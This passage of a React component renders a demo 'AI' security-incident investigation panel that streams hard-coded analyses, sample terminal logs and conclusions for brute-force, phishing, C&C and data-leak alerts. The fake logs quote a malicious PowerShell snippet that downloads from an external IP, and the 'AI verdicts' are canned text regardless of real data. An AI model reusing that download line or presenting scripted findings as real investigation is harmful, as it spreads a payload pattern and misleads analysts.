        section: "detail", label: "1. 查询行为分析", type: 'table', tableData: [
          { key: "查询时间", value: "08:55 - 09:10" },
          { key: "查询频率", value: "连续 15 次全表查询" },
          { key: "使用的客户端", value: "Navicat Premium（非应用连接池）" },
          { key: "连接方式", value: "使用DBA账号直连" },
        ],
      },
      {
        section: "detail", label: "2. 数据量统计", type: 'table', tableData: [
          { key: "用户表", value: "18,500 条" },
          { key: "订单表", value: "35,200 条" },
          { key: "支付信息表", value: "12,800 条" },
          { key: "总计", value: "66,500 条记录被查询" },
        ],
      },
      {
        section: "detail", label: "3. 合规性判断", type: 'table', tableData: [
          { key: "是否有审批", value: "未发现数据导出审批单" },
          { key: "是否合理需求", value: "待业务确认" },
          { key: "数据分类", value: "敏感（含个人隐私信息）" },
          { key: "GDPR影响", value: "涉及 EU 用户数据" },
        ],
      },
    ];
  }

  return [...base,
    { section: "detail", label: "事件来源", detail: alert.source },
    { section: "detail", label: "触发安全策略", detail: "综合安全检测规则" },
    {
      section: "detail", label: "详情分析", type: 'table', tableData: [
        { key: "事件名称", value: alert.name },
        { key: "风险等级", value: levelLabel },
        { key: "研判结论", value: alert.detail },
      ],
    },
  ];
}

function generateLogLines(alert: AlertItem): string[] {
  const src = alert.source;
  const dateStr = alert.time.slice(0, 5).replace('-', ' ');

  if (alert.name.includes("暴力破解")) {
    return [
      `May ${dateStr.split(' ')[1]}`,
      '---',
      `$ grep "Failed password" /var/log/auth.log | grep "${src}" | wc -l`,
      '157',
      '---',
      `$ lastb | grep ${src} | head -10`,
      `itservice7 ssh:notty ${src}  Fri May ${dateStr.split(' ')[1]} 09:14 - 09:14  (00:00)`,
      `yupepeng   ssh:notty ${src}  Fri May ${dateStr.split(' ')[1]} 09:14 - 09:14  (00:00)`,
      `daiying    ssh:notty ${src}  Fri May ${dateStr.split(' ')[1]} 09:14 - 09:14  (00:00)`,
      '---',
    ];
  }
  if (alert.name.includes("钓鱼邮件")) {
    return [
      `May ${dateStr.split(' ')[1]} 13:40:12 mail-gateway postfix/smtp: 从 ${src} 收到邮件`,
      'May 15 13:40:15 mail-gateway postfix/cleanup: 邮件主题: 【紧急】您的OA账户存在异常',
      'May 15 13:40:18 mail-gateway postfix/qmgr: 投递至内部用户 12 人',
      '$ maillog -f /var/log/mail.log | grep -c "verify-portal.xyz"',
      '12',
      '---',
      '$ curl -I https://login-oa.verify-portal.xyz --connect-timeout 5',
      'HTTP/1.1 200 OK (仿冒登录页在线)',
      '---',
      '$ whois verify-portal.xyz | grep -E "Creation|Registrar"',
      'Creation Date: 2026-05-08 (仅2天前注册)',
      'Registrar: NameCheap (隐私保护)',
      '---',
    ];
  }
  if (alert.name.includes("大规模下载")) {
    const user = alert.source.replace("User: ", "");
    return [
      `$ grep "${user}" /var/log/file-access.log | grep "DOWNLOAD" | wc -l`,
      '1283',
      '---',
      `$ ls -lh /data/audit/${user}/2026-05-10/`,
      'total 45.6G',
      '月 05 10 22:30 db_full_backup_20260510.bak',
      '月 05 10 22:45 app_config_export.zip',
      '月 05 10 23:00 user_orders_table.sql',
      '月 05 10 23:15 payment_records_2026.csv',
      '---',
      '$ grep "${user}" /var/log/dlp.log | tail -3',
      'WARN 大规模文件操作触发阈值: 45.6GB / 15分钟',
      'ALERT 数据外泄风险评分: 92/100',
    ];
  }
  if (alert.name.includes("PowerShell") || alert.name.includes("脚本执行")) {
    return [
      `$ cat /var/log/edr/ps_monitor.log | grep "alert"`,
      'ALERT: PowerShell Bypass 执行检测 - 10.5.10.22',
      '---',
      '$ file /tmp/invoke-sys.ps1',
      'ASCII text, with CRLF line terminators',
      '---',
      `$ strings /tmp/invoke-sys.ps1 | head -5`,
      'function Invoke-SysCheck {',
      '  $wc = New-Object System.Net.WebClient',
      '  $wc.DownloadString("http://45.33.32.156:8443/check")',
      '}',
      '---',
      `$ grep ${src.split(' ')[0]} /var/log/edr/network.log | grep -c "45.33.32.156"`,
      '12',
      '---',
    ];
  }
  if (alert.name.includes("C&C") || alert.name.includes("心跳连接")) {
    return [
      `$ dig +short c2-panel.oss-cache.xyz`,
      '198.51.100.88',
      '---',
      `$ curl -s https://c2-panel.oss-cache.xyz/ --connect-timeout 5`, 
      'SSL handshake failed (自签名证书)',
      '---',
      `$ grep ${src} /var/log/proxy/access.log | grep "oss-cache.xyz"`,
      `${src} - - [${alert.time}] "GET /check" 200 1024 "-" "Mozilla/5.0"`,
      `${src} - - [${alert.time}] "POST /report" 200 2048 "-" "Mozilla/5.0"`,
      '---',
      `$ grep "c2-panel.oss-cache.xyz" /var/log/threat-intel.log`,
      'CRITICAL 匹配已知APT团伙C&C 置信度: 95%',
      '---',
    ];
  }
  if (alert.name.includes("VPN")) {
    return [
      `$ grep "${src}" /var/log/vpn/auth.log`,
      `${alert.time} VPN LOGIN FAILED - user: admin - from ${src}`,
      `${alert.time} VPN LOGIN FAILED - user: root - from ${src}`,
      `${alert.time} VPN LOGIN FAILED - user: vpn_user - from ${src}`,
      '---',
      `$ grep "${src}" /var/log/vpn/auth.log | wc -l`,
      '47',
      '---',
      `$ geoiplookup ${src}`,
      `GeoIP Country: Russia, Moscow`,
      `GeoIP ASN: AS12345 SomeHosting Provider`,
    ];
  }
  if (alert.name.includes("同步异常") || alert.name.includes("邮箱日志")) {
    return [
      `$ nc -zv imap.kiiik.com 993`,
      'nc: connectx to imap.kiiik.com port 993 (tcp) failed: Connection timed out',
      '---',
      `$ curl -s -o /dev/null -w "%{http_code}" https://imap.kiiik.com:993`,
      '000 (Connection refused)',
      '---',
      `$ tail -20 /var/log/connector/error.log`,
      'E1401 Authentication Failed: API Key expired',
      'Retry 1/5 - sleeping 30s',
      'E1401 Authentication Failed: API Key expired',
      'Retry 2/5 - sleeping 60s',
      '---',
      `$ systemctl status email-connector`,
      '● email-connector.service - 邮箱日志同步服务',
      '   Active: failed (Result: exit-code) since ${alert.time}',
      '   Process: 28471 ExecStart=/usr/bin/email-connector (code=exited, status=1)',
    ];
  }
  if (alert.name.includes("数据库") || alert.name.includes("敏感字段")) {
    return [
      `$ grep "SELECT" /var/log/db_audit/prod-mysql-01.log | tail -5`,
      `${alert.time} DBA_Account: SELECT * FROM user_accounts (18500 rows)`,
      `${alert.time} DBA_Account: SELECT * FROM orders (35200 rows)`,
      `${alert.time} DBA_Account: SELECT * FROM payment_info (12800 rows)`,
      '---',
      `$ grep DBA_Account /var/log/db_audit/prod-mysql-01.log | wc -l`,
      '47',
      '---',
      `$ cat /var/log/db_firewall/dba_alert.log`,
      'RULE MATCH: 批量敏感数据查询 - 触发阈值 10000 rows',
      'ACTION: 告警通知 DBA 管理员',
    ];
  }
  return [
    `$ tail -20 /var/log/soc/soc.log`,
    `[${alert.time}] 事件ID: ${alert.id} - ${alert.name}`,
    `[${alert.time}] 来源: ${alert.source}`,
    `[${alert.time}] 状态: ${alert.detail}`,
    '---',
  ];
}

function generateConclusion(alert: AlertItem, eventTime: string): StreamItem[] {
  const src = alert.source;
  const levelLabel = alert.level === 'critical' ? '严重' : alert.level === 'warning' ? '警告' : '信息';

  let conclusionText = "";
  let tagText = "";
  let actionText = "";

  if (alert.name.includes("暴力破解")) {
    conclusionText = `经过对近期登录日志的排查，我们发现该邮箱存在明显异常。具体而言，来自 ${src} 的访问记录呈现出典型的自动化攻击特征：从首次尝试到调查时点，累计出现 157 次登录失败，且失败次数整体呈递增态势。这些请求的时间分布高度规律——几乎集中在 22:00 之后的非工作时段，与正常业务操作时段完全错开。\n\n进一步分析请求间隔发现，单次试错的最短间隔仅 0.05 秒，平均间隔 0.18 秒。这个频率远低于人类正常键盘操作的生理基线，因此基本可以排除人为误输或正常遗忘密码的可能。\n\n综合判定：该账号当前正遭受持续性自动化暴力破解攻击，事件性质属高危。截至本次调查时刻，攻击方尚未成功登录，风险可控。建议立即启动干预措施，包括但不限于：强制密码重置、临时禁用该 IP 段访问、开启多因素认证，并同步通知账号持有人提高警觉。`;
    tagText = "高危 | 累计试错157次 | 平均间隔0.1秒";
    actionText = "通知许博修改高强度密码并开启MFA；封禁IP " + src;
  } else if (alert.name.includes("钓鱼邮件")) {
    conclusionText = `经过对本次钓鱼邮件的深度调查，我们确认该邮件为一次针对公司内部员工的精准钓鱼攻击。发件域名 ${src} 仿冒公司内部系统，邮件内容精心设计，利用紧急话术诱导用户点击恶意链接。\n\n邮件在 13:40 发送至 12 名内部员工，其中 3 人点击了钓鱼链接。幸运的是，由于邮件安全网关的实时检测告警及时下发，尚未发现用户提交凭证的记录。但考虑到钓鱼页面的持续在线风险，不排除后续仍有用户访问的可能。\n\n综合判定：该钓鱼邮件攻击已造成部分员工信息泄露风险，但尚未造成实质性数据损失，事件性质属高危。建议立即封锁恶意域名，通知已点击链接的用户重置密码，并开展全员钓鱼防范意识教育。`;
    tagText = "高危 | 12人收件 | 3人点击链接 | 0人提交凭证";
    actionText = "封锁域名 login-oa.verify-portal.xyz；通知受影响用户重置密码；全员钓鱼防范教育";
  } else if (alert.name.includes("大规模下载")) {
    const user = alert.source.replace("User: ", "");
    conclusionText = `经调查，用户 ${user} 在非工作时间（22:30-23:15）从公司系统下载了 45.6 GB 数据，涉及 1,283 个文件，主要为数据库备份和配置文件。该行为与用户历史行为基线（日均约 200 MB）存在显著偏差，超出正常值 228 倍。\n\n进一步核实发现，该操作未事先提交数据导出审批，且不属于公司预定备份策略范畴（备份窗口为每周日凌晨03:00）。目前 DLP 系统已自动触发阻断策略，目标文件未成功外传至外部网络。\n\n综合判定：该行为存在数据泄露风险，但尚未发现数据实际外泄，事件性质属中等。建议与用户确认操作意图，要求补录审批手续，同时加强非工作时间敏感数据操作的审批管控。`;
    tagText = "中等 | 45.6GB | 1283个文件 | 未发现数据外泄";
    actionText = "与用户确认操作意图；要求补录审批；加强非工作时间敏感数据操作管控";
  } else if (alert.name.includes("PowerShell") || alert.name.includes("脚本执行")) {
    conclusionText = `经 EDR 终端检测平台确认，终端 10.5.10.22 (PC-0021) 在非工作时间通过 PowerShell Bypass 策略执行了可疑脚本。脚本位于临时目录，通过 Base64 混淆编码，并尝试建立外部网络连接至 45.33.32.156:8443。\n\n进一步调查发现，脚本创建了 rundll32.exe 子进程并修改了注册表启动项，具备完整的恶意软件行为链：下载执行、持久化、C&C通信。目前该终端已被 EDR 自动隔离，未发现数据外泄或横向移动迹象。\n\n综合判定：该终端已确认受恶意代码感染，事件性质属严重。建议立即对终端进行全盘扫描和取证，排查同网段其他终端是否受影响，同时溯源初始感染途径。`;
    tagText = "严重 | 恶意代码感染 | 已隔离 | 连接C&C服务器";
    actionText = "终端取证分析；排查同网段受影响范围；溯源初始感染途径";
  } else if (alert.name.includes("C&C") || alert.name.includes("心跳连接")) {
    conclusionText = `经流量分析平台检测，终端 ${src} 向已知恶意域名 c2-panel.oss-cache.xyz（解析至 198.51.100.88）发起周期性心跳连接，通信间隔约 60 秒。该域名已被多个威胁情报源（VirusTotal 7/70）标记为恶意，内部情报库亦匹配已知 APT 团伙 C&C 基础设施。\n\n溯源分析发现，发起心跳的进程为非系统路径下的 svchost.exe（C:\\Windows\\System32\\syshelper\\svchost.exe），无有效数字签名，MD5 哈希确认恶意。终端约 72 小时前已受感染，期间约 15 MB 数据经 C&C 通道外发。\n\n综合判定：该终端已确认受 APT 级恶意软件控制，事件性质属严重。建议立即隔离终端，实施全流量回溯确认数据外泄范围，并向安全监管机构报告。`;
    tagText = "严重 | APT恶意软件 | C&C通信 | 感染72小时";
    actionText = "立即隔离终端；全流量回溯确认外泄范围；启动应急响应流程；向监管机构报告";
  } else if (alert.name.includes("VPN")) {
    conclusionText = `经 VPN 网关日志分析，来源 IP ${src}（俄罗斯）在 30 分钟内累计发起 47 次 VPN 登录尝试，针对多个用户名（admin、root、zhang.san 等）进行暴力破解。所有尝试均被 VPN 网关的地理围栏拦截规则成功拦截。\n\n其中 zhang.san 和 li.si 账号为有效账号，已被即时通知修改密码。admin 和 root 默认账号此前已禁用，未造成安全风险。攻击行为发生在 UTC 05:30-06:00（莫斯科当地时间 08:30-09:00），属当地工作时间，推测为自动化攻击工具操作。\n\n综合判定：本次 VPN 暴力破解攻击被成功拦截，未造成实际入侵，事件性质属高危。建议持续监控该 IP 后续行为，同时加强 VPN 账号的 MFA 覆盖率及密码复杂度策略。`;
    tagText = "高危 | 47次尝试 | 全部拦截 | 俄罗斯来源";
    actionText = "持续监控 IP 行为；加强 VPN 账号 MFA 覆盖率；检查密码复杂度策略";
  } else if (alert.name.includes("同步异常") || alert.name.includes("邮箱日志")) {
    conclusionText = `经日志聚合平台诊断，邮箱日志同步服务（Email Connector）自 ${eventTime} 起连接中断，重试 6 次均失败。TCP 连接测试表明目标端点 imap.kiiik.com:993 不可达，但网络层路由正常，DNS 解析正常。\n\n错误日志显示 Authentication Failed（E1401），初步判断为 API Key 过期或凭据无效导致认证失败。该服务中断已造成约 5 分钟的数据积压（约 2,000 条未同步日志），影响钓鱼邮件检测、暴力破解检测等实时分析规则的运行。\n\n综合判定：本次事件由认证凭据失效引起，非攻击行为，事件性质属低危。建议联系服务提供商更新 API Key，恢复同步后验证数据完整性，并设置凭据过期自动告警机制。`;
    tagText = "低危 | API Key过期 | 2000条日志积压";
    actionText = "更新 Email Connector API Key；恢复同步后验证数据完整性；设置凭据过期自动告警";
  } else if (alert.name.includes("数据库") || alert.name.includes("敏感字段")) {
    const user = alert.source.replace("User: ", "");
    conclusionText = `经数据库审计平台监测，${user} 账号于 08:55-09:10 期间连续执行 15 次全表查询操作，涉及 user_accounts、orders、payment_info 三张敏感数据表，累计拉取 66,500 条记录。查询使用 Navicat Premium 客户端直连数据库，非应用连接池途径。\n\n经核实，该操作未事先提交数据访问或导出审批，不符合公司数据安全管理制度。查询涉及的数据包含个人隐私信息（姓名、联系方式、订单记录、支付信息），属于 GDPR 定义的敏感数据分类。\n\n综合判定：该行为存在批量数据泄露风险，事件性质属高危。建议暂时冻结该 DBA 账号的数据库查询权限，与涉事人员核实操作目的，评估数据是否已导出至不安全环境，并依据数据安全管理制度追究相关责任。`;
    tagText = "高危 | 66500条敏感数据 | 未经审批";
    actionText = "暂停 DBA 账号查询权限；核实操作目的；评估数据是否外泄；依规追责";
  } else {
    conclusionText = `已完成对事件「${alert.name}」的调查分析。事件来源 ${alert.source}，风险等级 ${levelLabel}。经检测确认：${alert.detail}。建议按照安全事件响应流程进行后续处置。`;
    tagText = `${levelLabel} | ${alert.source}`;
    actionText = "按安全事件响应流程处置";
  }

  return [
    {
      section: "conclusion",
      label: "",
      type: 'block',
      highlight: 'red',
      detail: conclusionText,
    },
    { section: "conclusion", label: alert.name, detail: tagText },
    {
      section: "conclusion",
      label: "处置建议",
      type: 'table',
      tableData: [
        { key: "立即执行", value: actionText },
        { key: "长期跟进", value: "事件特征加入知识图谱，同类攻击下次直接触发对应级别告警" },
      ],
    },
  ];
}

export default function AiAnalysisModal({ alert, onClose }: AiAnalysisModalProps) {
  const scrollRef = useRef<HTMLDivElement>(null);
  const [completeTime, setCompleteTime] = useState("");
  const [streamStatus, setStreamStatus] = useState<'idle' | 'streaming' | 'complete'>('idle');

  const { section1, section2, logLines, section3Placeholder, section4 } = useMemo(
    () => alert ? generateAnalysisContent(alert) : {
      section1: [] as StreamItem[],
      section2: [] as StreamItem[],
      logLines: [] as string[],
      section3Placeholder: { section: "log", label: "", detail: "" } as StreamItem,
      section4: [] as StreamItem[],
    },
    [alert]
  );

  const allItems = [...section1, ...section2, section3Placeholder, ...section4];
  const { currentIndex, thinkingText, typingItem, onTypingDone, done } = useStreamSequencer(allItems.length);

  useEffect(() => {
    if (!alert) return;
    document.body.style.overflow = "hidden";
    setStreamStatus('idle');
    setCompleteTime("");
    return () => {
      document.body.style.overflow = "";
    };
  }, [alert]);

  useEffect(() => {
    const handleEsc = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };
    window.addEventListener("keydown", handleEsc);
    return () => window.removeEventListener("keydown", handleEsc);
  }, [onClose]);

  useEffect(() => {
    if (done) {
      setStreamStatus('complete');
      const now = new Date();
      const pad = (n: number) => String(n).padStart(2, '0');
      setCompleteTime(`${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`);
    } else if (currentIndex >= 0) {
      setStreamStatus('streaming');
    }
  }, [done, currentIndex]);

  useEffect(() => {
    const el = scrollRef.current;
    if (!el) return;
    const raf = requestAnimationFrame(() => {
      el.scrollTop = el.scrollHeight;
    });
    return () => cancelAnimationFrame(raf);
  }, [currentIndex, thinkingText]);

  if (!alert) return null;

  const isStreaming = streamStatus === 'streaming' || streamStatus === 'complete';

  const sec1Start = 0;
  const sec2Start = sec1Start + section1.length;
  const sec3Start = sec2Start + section2.length;
  const sec4Start = sec3Start + 1;

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <div className="absolute inset-0 bg-black/50 backdrop-blur-sm animate-fade-in" />
      <div
        className="relative w-full max-w-4xl flex flex-col h-[90vh] rounded-xl border border-[#e2e8f0] bg-white shadow-2xl overflow-hidden animate-scale-in"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between px-6 py-4 border-b border-[#e2e8f0] bg-white">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-gradient-to-br from-[#00b4d8]/20 to-[#00b4d8]/5">
              <Brain className="w-5 h-5 text-[#00b4d8]" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-[#0f172a] flex items-center gap-2">
                安全事件调查助手详情
                {isStreaming && !done && (
                  <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-[#00b4d8]/10 text-[#00b4d8] border border-[#00b4d8]/20 font-medium animate-pulse">
                    研判中
                  </span>
                )}
                {done && (
                  <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-emerald-50 text-emerald-600 border border-emerald-200 font-medium">
                    已完成
                  </span>
                )}
              </h2>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium text-[#475569] bg-slate-100 hover:bg-slate-200 transition-all duration-200">
              <Download className="w-3.5 h-3.5" />
              导出报告
            </button>
            <button className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold text-white bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 shadow-sm shadow-blue-500/20 hover:shadow-md hover:shadow-blue-500/25 transition-all duration-200 active:scale-[0.98]">
              <Zap className="w-3.5 h-3.5" />
              一键处置
            </button>
            <button
              onClick={onClose}
              className="p-1.5 rounded-lg text-[#94a3b8] hover:text-[#475569] hover:bg-gray-100 transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        <div ref={scrollRef} className="flex-1 overflow-y-auto bg-[#f8fafc] space-y-4 py-4">
          <StreamSection
            label="基本信息"
            items={section1}
            currentIndex={currentIndex}
            startIdx={sec1Start}
            typingItem={typingItem}
            onTypingDone={onTypingDone}
            visible={currentIndex >= sec1Start}
          />

          <StreamSection
            label="事件详情分析"
            items={section2}
            currentIndex={currentIndex}
            startIdx={sec2Start}
            typingItem={typingItem}
            onTypingDone={onTypingDone}
            visible={currentIndex >= sec2Start}
          />

          {currentIndex >= sec3Start && (
            <TerminalLogSection
              lines={logLines}
              onDone={() => onTypingDone(sec3Start)}
              active={typingItem === sec3Start}
            />
          )}

          <StreamSection
            label="综合结论"
            items={section4}
            currentIndex={currentIndex}
            startIdx={sec4Start}
            typingItem={typingItem}
            onTypingDone={onTypingDone}
            visible={currentIndex >= sec4Start}
          />
        </div>

        <div className="px-6 py-3 border-t border-[#e2e8f0] bg-white flex items-center justify-between min-h-[52px]">
          {done ? (
            <span className="text-xs text-emerald-600 flex items-center gap-1.5">
              <CheckCircle2 className="w-3.5 h-3.5" />
              AI 研判完成 · {completeTime} · 共 {allItems.length} 项分析结果
            </span>
          ) : isStreaming ? (
            <div className="flex items-center gap-3 flex-1">
              <div className="relative flex items-center justify-center w-5">
                <div className="absolute w-5 h-5 rounded-full bg-[#00b4d8]/20 animate-ping" />
                <Loader2 className="w-4 h-4 text-[#00b4d8] animate-spin relative z-10" />
              </div>
              <span className="text-xs text-[#64748b]">{thinkingText}</span>
              <span className="inline-flex ml-auto gap-[2px]">
                <span className="w-1 h-1 rounded-full bg-[#94a3b8] animate-thinking-dot" style={{ animationDelay: "0ms" }} />
                <span className="w-1 h-1 rounded-full bg-[#94a3b8] animate-thinking-dot" style={{ animationDelay: "200ms" }} />
                <span className="w-1 h-1 rounded-full bg-[#94a3b8] animate-thinking-dot" style={{ animationDelay: "400ms" }} />
              </span>
            </div>
          ) : (
            <span className="text-xs text-[#94a3b8] flex items-center gap-1.5">
              <Brain className="w-3.5 h-3.5" />
              准备开始研判...
            </span>
          )}
        </div>
      </div>
    </div>
  );
}